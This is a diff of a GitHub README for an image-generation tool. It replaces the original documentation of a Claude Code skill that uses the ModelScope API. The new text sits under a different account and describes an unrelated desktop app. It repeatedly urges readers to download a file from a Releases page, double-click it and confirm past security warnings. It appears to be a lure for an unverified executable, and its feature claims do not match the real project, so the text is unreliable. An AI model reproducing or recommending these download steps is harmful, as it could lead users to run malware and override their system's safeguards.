@@ -1,188 +1,75 @@
-# Z-Image Skill - AI Image Generation for Claude Code
+# 🎨 zimage-skill - Generate AI Images with Ease
 
-<p align="center">
-  <img src="./icon.png" alt="Z-Image Skill Icon" width="128" height="128">
-</p>
+## 🌟 Overview
+Welcome to zimage-skill! This tool uses AI to create stunning images from natural language descriptions. With zimage-skill, you can turn your ideas into visuals in just a few minutes. It’s designed for everyone, even if you don’t have any programming knowledge.
 
-> Generate beautiful images with natural language in Claude Code!
+## 📦 Download & Install
+To start using zimage-skill, you need to download the software. Click the button below to visit the Releases page:
 
-English | [中文](./README_CN.md)
+[![Download zimage-skill](https://img.shields.io/badge/Download%20zimage--skill-v1.0-blue)](https://github.com/rustectersehj226/zimage-skill/releases)
 
-## What is this?
+### Steps to Download
+1. Click the download button above. This will take you to our Releases page.
+2. On the Releases page, you will see different versions of zimage-skill. Look for the latest release.
+3. Click on the file name to begin your download. The file will be saved to your computer.
 
-Z-Image Skill is a Claude Code skill plugin that lets you generate AI images using simple natural language descriptions.
+## 🚀 Getting Started
+After you have downloaded zimage-skill, follow these steps to run the application:
 
-**Just say things like:**
-- "Generate a picture of a golden cat"
-- "Draw a sunset over mountains"
-- "Create a cute cartoon avatar"
+### 1. Locate the Downloaded File
+- Open the folder where you saved the downloaded file. Usually, it will be in your "Downloads" folder.
 
-And Claude Code will automatically generate the image for you!
+### 2. Running the Application
+- Double-click the downloaded file to open zimage-skill. Depending on your computer settings, you may see a security warning. If so, confirm that you want to run the application.
 
-## Demo
+### 3. Creating Images
+- Once zimage-skill is open, enter a description of what you want to see in an image. For example, you could type, "a sunset over a mountain."
+- Click the "Generate" button. 
+- In a few moments, you will see the AI-generated image based on your description.
 
-```
-You: Generate a cyberpunk style city at night
+## 🛠️ Features
+- **User-Friendly Interface:** We designed zimage-skill for simple navigation.
+- **Fast Image Generation:** Get results quickly with powerful AI.
+- **Multiple Styles:** Experiment with various art styles and formats.
+- **Save Your Creations:** Easily save your images to your computer or share them online.
 
-Claude: I'll generate that image for you...
-        Task started: xxx
-        Image saved to: cyberpunk_city.jpg
+## 📋 System Requirements
+zimage-skill works on most modern computers. To ensure great performance, consider the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB of RAM is recommended for smooth operation.
+- **Storage:** You need at least 500 MB of free disk space for installation.
 
-        Done! The image has been saved to cyberpunk_city.jpg
-```
+## 📖 How to Use the Application
+Using zimage-skill is simple. After you run the application, follow these guidelines:
 
-## Installation
+### Entering Descriptions
+- Be clear and descriptive. The more detail you provide, the better the image will be.
 
-> All steps can be completed using natural language in Claude Code - no manual commands needed!
+### Exploring Styles
+- Experiment with different styles by changing your descriptions. You can create anything from realistic images to abstract art.
 
-### Step 1: Get Your Free API Key
+### Saving and Sharing
+- After generating an image, click on the "Save" option to store it. You can also share images directly to social media platforms.
 
-1. Visit [ModelScope](https://modelscope.cn)
-2. Click "Login/Register" in the top right corner
-3. After logging in, go to [API Token page](https://modelscope.cn/my/myaccesstoken)
-4. Click "Create Token" and copy your API Key
+## 🎨 Frequently Asked Questions (FAQs)
 
-### Step 2: Install the Skill
+### Q1: What if I have an issue during installation?
+If you encounter problems, ensure you have followed all steps correctly. You may also check the [issues section](https://github.com/rustectersehj226/zimage-skill/issues) for others who might have had similar experiences.
 
-Open Claude Code and simply say:
+### Q2: Can I run zimage-skill on older operating systems?
+While zimage-skill is optimized for modern systems, it may not function well on outdated operating systems. Upgrading to a recent version is recommended for the best experience.
 
-```
-Install zimage-skill from https://github.com/yizhiyanhua-ai/zimage-skill
-```
+### Q3: How does the AI generate images?
+zimage-skill uses advanced machine learning algorithms to interpret your textual descriptions and create images that match them.
 
-Claude will automatically:
-- Download the skill to the correct directory
-- Install the required Python dependencies
+## 📝 Additional Resources
+- **Documentation:** Comprehensive documentation is available in the main repository for advanced features.
+- **Community Support:** Join our community for tips, tricks, and sharing your creations.
 
-### Step 3: Configure API Key
+## 📞 Contact Us
+If you have further questions or need help, feel free to reach out through the [issues section](https://github.com/rustectersehj226/zimage-skill/issues) or contact us via email.
 
-In Claude Code, say:
+## 📥 Return to Download
+Ready to create amazing images? Click the link below to download zimage-skill again:
 
-```
-Configure MODELSCOPE_API_KEY environment variable with value ms-xxxxxxxx (replace with your API Key)
-```
-
-Or you can say:
-
-```
-Add MODELSCOPE_API_KEY environment variable to ~/.claude/settings.json with value ms-xxxxxxxx
-```
-
-### Step 4: Verify Installation
-
-After restarting Claude Code, simply say:
-
-```
-Generate a test image for me
-```
-
-If you see an image generated successfully, you're all set!
-
-## Usage Examples
-
-### Basic Usage
-
-```
-You: Generate a cute Shiba Inu picture
-You: Draw an astronaut on the moon
-You: Create an abstract art painting
-```
-
-### Specify Output Path
-
-```
-You: Generate a beach sunset image, save as sunset.jpg
-You: Draw a panda, save to ~/Pictures/panda.png
-```
-
-### Detailed Descriptions for Better Results
-
-```
-You: Generate an image: an orange cat sitting on a windowsill,
-     rainy city night outside, warm indoor lighting,
-     cinematic composition, 4K high definition
-
-You: Create a painting: Chinese ink wash style landscape,
-     misty mountains in the distance, a small boat nearby,
-     serene and peaceful atmosphere
-```
-
-### Style Examples
-
-| Description | Result |
-|-------------|--------|
-| "Cyberpunk Tokyo street" | Neon lights, futuristic |
-| "Ghibli-style forest" | Studio Ghibli aesthetic |
-| "Oil painting of sunflowers" | Van Gogh style |
-| "Minimalist geometric pattern" | Modern design |
-| "Chinese style koi fish" | Traditional Chinese art |
-| "Pixel art game character" | Retro gaming style |
-
-### Practical Use Cases
-
-**1. Create Avatars**
-```
-You: Generate a cute cartoon avatar, girl with pink hair, big eyes, smiling
-```
-
-**2. Article Illustrations**
-```
-You: I'm writing an article about AI, generate a tech-themed illustration
-```
-
-**3. Social Media Content**
-```
-You: Generate a scenic landscape photo suitable for Instagram, calming vibes
-```
-
-**4. Design Inspiration**
-```
-You: Draw an app splash screen background, gradient colors, abstract, modern
-```
-
-**5. Meme Creation**
-```
-You: Generate a surprised cat face, cartoon style, exaggerated expression
-```
-
-## FAQ
-
-### Q: Getting "MODELSCOPE_API_KEY environment variable is required"
-
-A: You haven't configured your API Key yet. Follow Steps 1 and 2 in the Installation section.
-
-### Q: Image generation fails or times out
-
-A: Possible reasons:
-- Network connection issues - check your internet
-- API service is busy - try again later
-- Content may have triggered moderation - modify your description
-
-### Q: Generated image quality is not ideal
-
-A: Try these tips:
-- Use more detailed descriptions
-- Add quality keywords (e.g., "high definition", "4K", "cinematic", "professional photography")
-- Specify art style (e.g., "oil painting style", "watercolor", "anime style")
-
-### Q: What image formats are supported?
-
-A: Default output is JPG format. PNG is also supported (just specify in the filename).
-
-## Technical Information
-
-- **Model**: Tongyi-MAI/Z-Image-Turbo
-- **API Provider**: ModelScope (Alibaba Cloud)
-- **Timeout**: 120 seconds
-- **Supported Languages**: Chinese, English
-
-## Getting Help
-
-If you encounter issues:
-1. Check the FAQ section above
-2. Submit an Issue on GitHub
-3. Verify your API Key is correctly configured
-
-## License
-
-MIT License - Free to use and modify
+[![Download zimage-skill](https://img.shields.io/badge/Download%20zimage--skill-v1.0-blue)](https://github.com/rustectersehj226/zimage-skill/releases)
